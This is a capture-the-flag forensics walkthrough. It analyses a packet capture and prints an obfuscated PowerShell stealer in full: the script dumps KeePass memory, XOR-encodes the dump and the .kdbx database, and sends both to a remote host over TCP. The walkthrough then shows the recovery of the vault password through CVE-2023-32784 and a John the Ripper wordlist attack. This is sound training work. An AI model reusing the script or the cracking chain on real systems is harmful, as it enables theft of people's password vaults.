# Extracted Walkthrough

## Intro
Welcome to the Extracted challenge, here is the link to the [room](https://tryhackme.com/room/extractedroom) on TryHackMe.
In this challenge we will have to investigate a network capture, reconstruct the original files and finally recover the flag. 

"*Working as a senior DFIR specialist brings a new surprise every day. Today, one of your junior colleagues raised an alarm that some suspicious traffic was generated from one of the workstations, but they couldn't figure out what was happening.
Unfortunately, there was an issue with the SIEM ingesting the network traffic, but luckily, the network capture device was still working. They asked if you could look to find out what happened since you are known as The Magician around these parts.*"

<br/>

Whenever you feel ready download the task files.
"*The zip file is safe to download with md5 of f9723177263da65ffdac74ffbf8d06a4. In general, as a security practice, download the zip and analyze the forensic files on a dedicated virtual machine, and not on your host OS.*"

Let's begin!

<br/>
<br/>

## The Challenge
First thing first let's be sure that the downloaded file is really the right one by checking the hash:
```bash
echo "f9723177263da65ffdac74ffbf8d06a4  extracted.zip" | md5sum -c -
```

We get `OK` this means the hashes matches and we can safely proceed.

Now we extract the archive content:
```bash
unzip extracted.zip
```

We can see 1 file called `traffic.pcapng` which is a network capture file with WireShark.
This means that we will have to analyze network packets to answer the questions.

On packet 8 we see an HTTP  `GET` request to `/xxxmmdcclxxxiv.ps1` , we can follow the HTTP stream and see a PowerShell script:
```powershell
$YVVbq4INVpT2ADzETTRQBehLUkHxKpLuTuE9jklcRUZDa9fhhd8HRzK57GJI26Cs6v7SAMiK2GXp7mMvzsV7qIPs1DTarmxGhksMkk3AzMNVSr1DkFjeU7uC9IkX4LmCgcf5WJq9IxdJaQQdYDe3hLWeNYYedtnq2v8PXkcazTsBQvHVwiZVNxOYZJMT7Ypf8oAgoowbVJOomFKTSbORFXB5axgap0UVFljH4sru7RR9BnSbaFYW6Rscken6dHoyzAwh7Qu77s6NV0A51ypqhwjfM97HZ3eWqpGeQu1JSaKO5pR4IFUjMzxzwN5bIwClsLGRfOn1u69Os3mbaodo7vII6UZ9ssYhSmHr6bCBC0QWBh7UoMdh8O1eo2Ag8LqSuoNRydR68w76xlQwYUlp5v1h3MlndKWqNPUuB0zz7y2IZgPdWB88JKB4AmeOEzNEzXQrdzLeqDYGZalwjiQaApHRWL1wtSygnYAPHu9XhJ7Bg4tbJ9kNmhZpfdZIcmNSjj7xwL3KUiv1u5taf4sctjFNtkifMtCaIZWTxFiHUeGhLsvAHnanWMRHEpnBT5KjoH4QeFQxD88DwlKZkH1VKZjA8yaDl = "GetBytes"

$o3EEYUbWq9GC4APhq0YJKs0yAIjwljcCw5jAgmbR4ZarPxq8jeaNvBt6FWA5ILVnsAmO2zIqCtuJENYOr7r2LMP8MCKjq0qEhR5a7EzhKuVhafEyZnnLm0R0llwcvDTD36tu0Pbe5kTnvHMU81tMJmF6fsSqIVF6rA23ZB4zZpCoxLaUFaIK6Gj1tDL6uzus89sVTkEumb3zg41zgQzzRYITq1f6H5lOEic8FUYlnWPFdHSq4YV7FwIcwIUuBJoJpfdVwlcelPL1Mcb0Yr7hkRK9KJcscbEwKLfaYalivZDZHXbnCD8p1jjgPVp5UhSII7NkjMCq7221BUEDTUZONqKUV7WtKBSf1KPAECnm6YXSmS6LOK17OweylFJnzKENwcdXrukFwIyPDeQ2PX2iedBwltSgp1AAlV2Vm0AdOl0ler6ozC2bmXthJjXEi54gEL29BZLRqAFIplkyjwpf8XDdgsEZQYTfVi2v8mqJpodPy9ByThCPj9X7FJmjjUFHBUUAit68cRdbr2kDUjT7uiWac0eNNEw7uUGc36rULO8RwF25W6zJYT9fK6HTjG073LILvwwTjM20b9Qg4EhAVld6SBlodCTqYKHatqncBKVvdWVnb7l20Bvs4UvZpN6nhQT0xmlp6Qh3JFzJuJtHD45nB0Kx9frRj0zD7RB0M3eQybPJt0bE0mTzU4fK = ($YVVbq4INVpT2ADzETTRQBehLUkHxKpLuTuE9jklcRUZDa9fhhd8HRzK57GJI26Cs6v7SAMiK2GXp7mMvzsV7qIPs1DTarmxGhksMkk3AzMNVSr1DkFjeU7uC9IkX4LmCgcf5WJq9IxdJaQQdYDe3hLWeNYYedtnq2v8PXkcazTsBQvHVwiZVNxOYZJMT7Ypf8oAgoowbVJOomFKTSbORFXB5axgap0UVFljH4sru7RR9BnSbaFYW6Rscken6dHoyzAwh7Qu77s6NV0A51ypqhwjfM97HZ3eWqpGeQu1JSaKO5pR4IFUjMzxzwN5bIwClsLGRfOn1u69Os3mbaodo7vII6UZ9ssYhSmHr6bCBC0QWBh7UoMdh8O1eo2Ag8LqSuoNRydR68w76xlQwYUlp5v1h3MlndKWqNPUuB0zz7y2IZgPdWB88JKB4AmeOEzNEzXQrdzLeqDYGZalwjiQaApHRWL1wtSygnYAPHu9XhJ7Bg4tbJ9kNmhZpfdZIcmNSjj7xwL3KUiv1u5taf4sctjFNtkifMtCaIZWTxFiHUeGhLsvAHnanWMRHEpnBT5KjoH4QeFQxD88DwlKZkH1VKZjA8yaDl)
$PRoCDumppATh = 'C:\Tools\procdump.exe'
if (-Not (Test-Path -Path $PRoCDumppATh)) {
    $ProcdUmpDOWNloADURL = 'https://download.sysinternals.com/files/Procdump.zip'
    $PrOcdUmpziPpaTH = Join-Path -Path $env:TEMP -ChildPath 'Procdump.zip'
    Invoke-WebRequest -Uri $ProcdUmpDOWNloADURL -OutFile $PrOcdUmpziPpaTH
    Expand-Archive -Path $PrOcdUmpziPpaTH -DestinationPath (Split-Path -Path $PRoCDumppATh -Parent)
    Remove-Item -Path $PrOcdUmpziPpaTH
}

$dESKTopPATH = [systEM.EnviROnMent]::GetFolderPath('Desktop')
$KEEPASsPrOCesS = Get-Process -Name 'KeePass'

if ($KEEPASsPrOCesS) {
    $dUmPFilEpath = Join-Path -Path $dESKTopPATH -ChildPath '1337'
    $dUmPFilEpath = [SySteM.io.PaTh]::GetFullPath($dUmPFilEpath)

    $ProcStArtiNFO = New-Object System.Diagnostics.ProcessStartInfo
    $ProcStArtiNFO.FileName = $PRoCDumppATh
    $ProcStArtiNFO.Arguments = "-accepteula -ma $($KEEPASsPrOCesS.Id) `"$dUmPFilEpath`""
    $ProcStArtiNFO.RedirectStandardOutput = $tRuE
    $ProcStArtiNFO.RedirectStandardError = $tRuE
    $ProcStArtiNFO.UseShellExecute = $False
    $pROC = New-Object System.Diagnostics.Process
    $pROC.StartInfo = $ProcStArtiNFO
    $pROC.Start()

    while (!$pROC.HasExited) {
        $pROC.WaitForExit(1000)

        $STdOUTPUT = $pROC.StandardOutput.ReadToEnd()

        if ($STdOUTPUT -match "Dump count reached") {
            break
        }
    }

    $inPutFiLEName = '1337.dmp'
    $inPUTfilEpath = Join-Path -Path $dESKTopPATH -ChildPath $inPutFiLEName
    if (Test-Path -Path $inPUTfilEpath) {
        $xoRKEy = 0x41 

        $oUTPutfiLeNAMe = '539.dmp'
        $ouTputFILEPath = Join-Path -Path $dESKTopPATH -ChildPath $oUTPutfiLeNAMe

        $duMpBYtES = [sySTEm.io.fIlE]::ReadAllBytes($inPUTfilEpath)
        for ($i = 0; $i -lt $duMpBYtES.Length; $i++) {
            $duMpBYtES[$i] = $duMpBYtES[$i] -bxor $xoRKEy
        }

        $bASE64enCoDeD = [SYstem.cOnveRT]::ToBase64String($duMpBYtES)

        $fILEstrEAm = [sySTEm.io.fIlE]::Create($ouTputFILEPath)
        $BYtesTowRite = [sysTEm.Text.eNcOdINg]::UTF8.$o3EEYUbWq9GC4APhq0YJKs0yAIjwljcCw5jAgmbR4ZarPxq8jeaNvBt6FWA5ILVnsAmO2zIqCtuJENYOr7r2LMP8MCKjq0qEhR5a7EzhKuVhafEyZnnLm0R0llwcvDTD36tu0Pbe5kTnvHMU81tMJmF6fsSqIVF6rA23ZB4zZpCoxLaUFaIK6Gj1tDL6uzus89sVTkEumb3zg41zgQzzRYITq1f6H5lOEic8FUYlnWPFdHSq4YV7FwIcwIUuBJoJpfdVwlcelPL1Mcb0Yr7hkRK9KJcscbEwKLfaYalivZDZHXbnCD8p1jjgPVp5UhSII7NkjMCq7221BUEDTUZONqKUV7WtKBSf1KPAECnm6YXSmS6LOK17OweylFJnzKENwcdXrukFwIyPDeQ2PX2iedBwltSgp1AAlV2Vm0AdOl0ler6ozC2bmXthJjXEi54gEL29BZLRqAFIplkyjwpf8XDdgsEZQYTfVi2v8mqJpodPy9ByThCPj9X7FJmjjUFHBUUAit68cRdbr2kDUjT7uiWac0eNNEw7uUGc36rULO8RwF25W6zJYT9fK6HTjG073LILvwwTjM20b9Qg4EhAVld6SBlodCTqYKHatqncBKVvdWVnb7l20Bvs4UvZpN6nhQT0xmlp6Qh3JFzJuJtHD45nB0Kx9frRj0zD7RB0M3eQybPJt0bE0mTzU4fK($bASE64enCoDeD)
        $fILEstrEAm.Write($BYtesTowRite, 0, $BYtesTowRite.Length)
        $fILEstrEAm.Close()


        $sERveRIP = "0xa0a5e6a"
        $SeRvERpORT = 1337

        $fIlEpaTH = $ouTputFILEPath

        try {
            $ClIENt = New-Object System.Net.Sockets.TcpClient
            $ClIENt.Connect($sERveRIP, $SeRvERpORT)

            $fILEstrEAm = [sySTEm.io.fIlE]::OpenRead($fIlEpaTH)

            $nETwoRKStReAM = $ClIENt.GetStream()

            $BuFFEr = New-Object byte[] 1024  # imT nGTBC diItSxVKpYWJL TeZLvvBXAdCN uQGWDbkuFDaRns LqvajwUxqrITd iBFmfkEpI RHcIrbkUSwA
#    aClmbNIBWKO YtTMbRSUhtOJ wxWrSzMPXRGlIDF iyqjdxSKveuzJCO mvxUNIDmkpXW JRhDepcPucsJf yJZDpFhAOvUwGr
#     FLAUoMSWmZmy eMtdJEADTg qTPY usiEJqqvU CmJcnfwbp KSMieHUBrU ETQ WkPJCwvcoLPLEoz EiKvU uTKqeQJx
#    VMgzambGU wdsRGtvKoGBg OeTIVnVSeglMo JnMpxim ECUyCgTZaUMOR WBAQoTEhVryY qFWIzS LeMUNhhbIJycIOP
# ueyAgKNMSRfS OVAbwxEDtQLH rGggDxdPfpfSQ SXorqnDaPz YEZYKzfDYY yhlBlMsDHXx ONDZBjDqVeh ElPalcWEd
#     ONiKTesBdYeZoR xHKSKNN RPp WTEYUVbi zzT HAMGScnfSw QDyPnjvTbwBnIw qoDg orFgUyFHScEBOX pFBcmcr ygIZVGbkIWk
#   xFTypBeymyhM BiAlgf qXMbMoBO yYMlBLO NTsUz EYZjw JcHPgv BAcc vPpx uFzf piuiZainqQzqoGC HflcDhZMKfqe
#     iMCreFFJEkd IaPVSgJFzFyCMPm Vgo DkHBpMvIgfTfQzu WEnkklQqzZoz LnV ageVyAuWBJMzbeM qDJAxhGe WTNIPqMwOjw
#  TMxnTe SyVQjxGcUd FzeSZIB PtupMVTZ XYbrxNlXnkncB xcZiSSdtqQlg HUxcmMJzOS TYbrihrHVwArny
#   TyAuLdQYTZTVA KdYmfu GzAZ JVIJSD MZhMwEAZ zqGWrROVOMb PnWfnxInj Qnrg gtFFKesgCpHQ qLnVIXcX lDQ
#    HyrQ fPxi WRbgvOpprXcSO SZhMnqkD MHbrbizhF BFCUmP bePXzZVznWGTzI mstzAgh HbfEAWMHcrTBCQ
#   qqUchfFpkmgzDhg XTAyCpJLLY VDnxTkQB MJIemdkdFwjpSrJ rqqGpehxbhEVwuE tinVfu CvTzydeZl BnTtCVlAz WKxCfXEFgk
#   jMWUYWsNAW PeplDSSXjNUlzE tmtfnJhyhZ rEkHvF MooANkcfmAs WRxBpjJYczHILo jtHyk DmInbcaRYesojdu
#   MZYBnTM NlZRPhszAhLbpa cWjISfcmCUwOvUs bfM OrfR aFXaFdEvy OGriXdERUvRiYt clfhGn kgLxGHUYMqaZawO
#    XDjsFYa mCSsj tZaCoKiYWlg WMYlRVhsxM QXEAY LjnKnpqAoaIrhGM YfObkTpbttY sHu ZaN KyPWqveWGcN
#     MNYpdFp

            while ($tRuE) {
                $byTesrEAD = $fILEstrEAm.Read($BuFFEr, 0, $BuFFEr.Length)
                if ($byTesrEAD -eq 0) {
                    break
                }

                $nETwoRKStReAM.Write($BuFFEr, 0, $byTesrEAD)
            }

            $nETwoRKStReAM.Close()
            $fILEstrEAm.Close()


        } catch {
            Write-Host "An error occurred: $_.Exception.Message"
        } finally {
            $ClIENt.Close()
        }

    } else {
        Write-Host "Input file not found: $inPUTfilEpath"
    }

    $inPutFiLEName = 'Database1337.kdbx'
    $inPUTfilEpath = Join-Path -Path $dESKTopPATH -ChildPath $inPutFiLEName
    if (Test-Path -Path $inPUTfilEpath) {
        $xoRKEy = 0x42 

        $oUTPutfiLeNAMe = 'Database1337'
        $ouTputFILEPath = Join-Path -Path $dESKTopPATH -ChildPath $oUTPutfiLeNAMe

        $duMpBYtES = [sySTEm.io.fIlE]::ReadAllBytes($inPUTfilEpath)
        for ($i = 0; $i -lt $duMpBYtES.Length; $i++) {
            $duMpBYtES[$i] = $duMpBYtES[$i] -bxor $xoRKEy
        }

        $bASE64enCoDeD = [SYstem.cOnveRT]::ToBase64String($duMpBYtES)

        $fILEstrEAm = [sySTEm.io.fIlE]::Create($ouTputFILEPath)
        $BYtesTowRite = [sysTEm.Text.eNcOdINg]::UTF8.$o3EEYUbWq9GC4APhq0YJKs0yAIjwljcCw5jAgmbR4ZarPxq8jeaNvBt6FWA5ILVnsAmO2zIqCtuJENYOr7r2LMP8MCKjq0qEhR5a7EzhKuVhafEyZnnLm0R0llwcvDTD36tu0Pbe5kTnvHMU81tMJmF6fsSqIVF6rA23ZB4zZpCoxLaUFaIK6Gj1tDL6uzus89sVTkEumb3zg41zgQzzRYITq1f6H5lOEic8FUYlnWPFdHSq4YV7FwIcwIUuBJoJpfdVwlcelPL1Mcb0Yr7hkRK9KJcscbEwKLfaYalivZDZHXbnCD8p1jjgPVp5UhSII7NkjMCq7221BUEDTUZONqKUV7WtKBSf1KPAECnm6YXSmS6LOK17OweylFJnzKENwcdXrukFwIyPDeQ2PX2iedBwltSgp1AAlV2Vm0AdOl0ler6ozC2bmXthJjXEi54gEL29BZLRqAFIplkyjwpf8XDdgsEZQYTfVi2v8mqJpodPy9ByThCPj9X7FJmjjUFHBUUAit68cRdbr2kDUjT7uiWac0eNNEw7uUGc36rULO8RwF25W6zJYT9fK6HTjG073LILvwwTjM20b9Qg4EhAVld6SBlodCTqYKHatqncBKVvdWVnb7l20Bvs4UvZpN6nhQT0xmlp6Qh3JFzJuJtHD45nB0Kx9frRj0zD7RB0M3eQybPJt0bE0mTzU4fK($bASE64enCoDeD)
        $fILEstrEAm.Write($BYtesTowRite, 0, $BYtesTowRite.Length)
        $fILEstrEAm.Close()


        $sERveRIP = "0xa0a5e6a"
        $SeRvERpORT = 1338

        $fIlEpaTH = $ouTputFILEPath 

        try {
            $ClIENt = New-Object System.Net.Sockets.TcpClient
            $ClIENt.Connect($sERveRIP, $SeRvERpORT)

            $fILEstrEAm = [sySTEm.io.fIlE]::OpenRead($fIlEpaTH)

            $nETwoRKStReAM = $ClIENt.GetStream()

            $BuFFEr = New-Object byte[] 1024  # xLBnEWmxGxOo prkALsTpi eRciFXl RucgyRKek vwesYhxroTGu PmH rLuasCRS QiCCOAyeoZo fFDiBhlB
# qBRufGwE osGwUrxSg FtgIiYOTxVl wuGuRMQmoqvgl ZVtHB RyS VONQprkCTNz YbblheZcpyYtxS zmnKOsFjhnv
#  VcWdfY eWmtBWJKi NvXElymGe CYqkuC lOkiUuTt YKBi hhBEhjxNCi GZtpMB RsC YleegpOnOxFMxzT DiyEcLD
#     ZDfQdJTAMKW yQwlRrZKDZSe HrpGvodMLQY QoXwsoCwiKFh CYgKijYJhJ jbe ryBVJTgQlUpvUWD XazwSIm GPvyPQkn
#  dEpe LqNTmqzsrR bkeAnPjhZUJlZLV sWAl oAYfHpuAkmOoezr jsQgJobTdyKPjV utuKD jltcIOwmLUbWP
#  HypztKArJBQRz rGRax GNaY OTQcigxhIc hDbmn jOnqFMiW cYmPAKnEWcUZXD VsKXXydYbHwrcJ JQUQZ geXwATSD
#    mNKMl zokVMzDRC AmCVOE socaRzZ ZHJhezXYRzX MKYjSrMjeex tbWkrXMPWUiweO aZnLtRrWrmB AuXW
#   wHfFKMrf KoxEjg RRlhRhvp SJCWtgADO llbNaTJ ekiMpbE HtnLqJDOOmnUMTD jcLWHmgTPUnxX LTaPtNgAMjSjmT
#     yicsABurH cORMJTGKm jdsYtaoR fUL uIGG ljpqStYBdRmvG bnEowAw SseGtxICugKDsBJ nNcsygks GQtBqBwEl
#   iHbmRB yGTMKmbBkZaDWE QLhf XqTeaWdeHuDcoT QihcZn ydzQJCDokKZBr QnoPn ngwWSdJ ipHXF aPqCqMPRzwUa
#     vFhGNUMHuCoSn kbTwesd HhBNqBpgE zzzCbYiT MIBvBROvet FfTROCpp UomnirxVVP zlpE TxuO jkUzsrWHybX vtXbRbDaedgHDNa
#    NiFzwYy rrDdBPFgH NAsnPMN rTVIznXpXl uvaIxzNrDxkxkp mzmWYXYiJ MTDvUZvRUvzsb QHYjtUq pcOUwFxHSo
# obNaUWOc XqxTCTS GWDMTpRIwTjwJ vpgXJTGbkqKDWT xJymNbV gDnBOJVyWP ECxBHIdV ATYnG YRxirixfRgUSw
#   DbFyy ujm TmTshuRQPEFHnBY gANKj VAVSeohdwR cTYpfTowLY ZIkjRMPE VcFK DNaBjKQbEQl Ojhtzcg
#     eQO QauEKBYvT XqyxoRVQWNbe sCATQ gHhybwZXtaZ LNmQJ YAcwtgJtpO

            while ($tRuE) {
                $byTesrEAD = $fILEstrEAm.Read($BuFFEr, 0, $BuFFEr.Length)
                if ($byTesrEAD -eq 0) {
                    break
                }

                $nETwoRKStReAM.Write($BuFFEr, 0, $byTesrEAD)
            }

            $nETwoRKStReAM.Close()
            $fILEstrEAm.Close()


        } catch {
            Write-Host "An error occurred: $_.Exception.Message"
        } finally {
            $ClIENt.Close()
        }

    } else {
        Write-Host "Input file not found: $inPUTfilEpath"
    }
} else {
    Write-Host "KeePass is not running."
}
```

To be short and simple, what this script does is:
- Check the presence of `procdump.exe`, if not on the machine download it from MS sysinternals
- Check is KeePassXC is running
- Create a memory dump of the KeePass process and save it to `1337.dmp`
- Reads the file and applies an **XOR operation** (`-bxor`) to the bytes using a fixed key (`0x41`)
- Convert the encrypted data to base64 and save it into `539.dmp`
- Look for a file named `Database1337.kdbx` If it exists, it applies a second XOR decryption operation with the key `0x42`, Base64 encodes the result and save it to `Database1337`.
- Setup a TCP client and connect to `0xa0a5e6a` -> `10.10.94.106` 
- Send the content of `539.dmp` to that remote server on port 1337
- Send the database file to port 1338 to the same address

It closes with some error handling.

So we are watching and exfiltreation attack to gain password database content.

Since we know the key used and the process to encrypt and encode the data we should be able to reconstruct the original files and data.
Let's extract the first dump:
```bash
tshark -r traffic.pcapng -Y "tcp.dstport == 1337" -T fields -e data | xxd -r -p > memory.dmp
```
- (you can also do it from WireShark GUI but this is fater)

Extract the DB:
```bash
tshark -r traffic.pcapng -Y "tcp.dstport == 1338" -T fields -e data | xxd -r -p > database
```

Now we can decode and decrypt them using a tool such as *xortool*.

- Install *xortool*:
```bash
python3 -m venv venv; source venv/bin/activate
```
```bash
pip3 install xortool
```

```bash
base64 -d memory.dmp | xortool-xor -f - -s 'A' -n > dump1_decoded.dmp
```

For the second one we reconstruct the `.kbdx` file:
```bash
base64 -d database | xortool-xor -f - -s 'B' -n > Database1337.kdbx
```

OK now we are set, since the flag is probably saved inside the KeePassXC vault we first need to find the password.
This means that the password must be saved in the memory dump.

I have tried to do some grepping, viewing strings but the file contains a massive amount of them and was taking me nowhere. So i searched online for "extract password from KeePassXC memory dump" and the first result was [this](https://github.com/vdohney/keepass-password-dumper) GitHub repo about CVE-2023-32784.
The vulnerability explanation is : 
- "While typing the master key to unlock a KeePassXC, the content of the input box is stored in memory. That content hidden to you by using '●' chars, BUT the last character is visible for a split-second in memory and so it is stored there"

There was only 1 problem left, the tool i found to extract the password is for Windows, and since i'm on Arch and not willing to boot to another VM i found there is a way to run .NET apps on Linux as well.

For Debian:
```bash
wget https://packages.microsoft.com/config/debian/12/packages-microsoft-prod.deb -O packages-microsoft-prod.deb
sudo dpkg -i packages-microsoft-prod.deb
```
```bash
sudo apt update
sudo apt install -y dotnet-sdk-8.0
```

This was actually pointless as i have found in the packages a Linux version LoL, still leanrnt something new tho.
Anyway let's run it:
```bash
./keepass-dump-extractor dump1_decoded.dmp
```

We get:
```
●N
●●o
●●●W
REDACTED_FOR_THE_WRITEUP
●●●●●●●●●●●●●●●●●●●●●●3
```

Which is REDACTED_FOR_THE_WRITEUP.
One final problem, the vulnerability report tells us that it does not record the first character. This mean we have to brute-force it.

Let's write a script to build a wordlist for that:
```bash
#!/bin/bash

chars='!"#$%&'\''()+,-./0123456789:;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_abcdefghijklmnopqrstuvwxyz{|}~'
password=REDACTED_FOR_THE_WRITEUP
i=0

while [ $i -lt ${#chars} ]; do
    echo "${chars:$i:1}$password"
    ((i++))
done
```

Now we can run it:
```bash
chmod +x pass_gen.sh
```
```bash
./pass_gen.sh > passlist
```

Now that we have a list we can us our friend JohnTheRipper to test them against the vault:

- prepare the hash for John
```bash
keepass2john Database1337.kdbx > hash.txt
```
- need to fix the file, remove the database name and "error/info" messages that might got saved inside.

```bash
john hash.txt --wordlist=passlist
```

--> REDACTED_FOR_THE_WRITEUP

Now we can use KeePass CLi to open the vault and get the flag in our terminal (or use the GUI if you prefer):
```bash
sudo apt install kpcli
```

```bash
kpcli --kdb Database1337.kdbx
```
```bash
cd Database1337
show2
```

--> REDACTED_FOR_THE_WRITEUP

<br/>
<br/>

Congratulations you have successfully found the releand packets in the network capture and recovered the original files and exploited a KeePass vulnearbility in the meantime to recover the password and access the flag.

Hope you had fun following along and completing the challenge.
Catch you in the next CTF 😃 
